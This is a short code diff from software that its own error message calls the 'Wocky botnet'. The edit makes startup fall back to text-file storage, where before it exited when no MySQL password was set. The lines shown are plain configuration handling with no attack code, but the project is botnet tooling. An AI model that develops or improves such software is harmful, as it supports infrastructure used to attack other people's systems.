@@ -50,8 +50,7 @@ fn main() {
 	}
 
 	if w.sqlconn.password == "" {
-		println("${config.Red}[${utilities.current_time()}][x]${config.Default}  Error, No MySQL password provided. Wocky botnet cannot start without a database......!")
-		exit(0)
+		println("${config.Red}[${utilities.current_time()}][x]${config.Default}  Error, No MySQL password provided. Using text file databases....!")
 	}
 
 	if w.sqlconn.host.len == 0 {
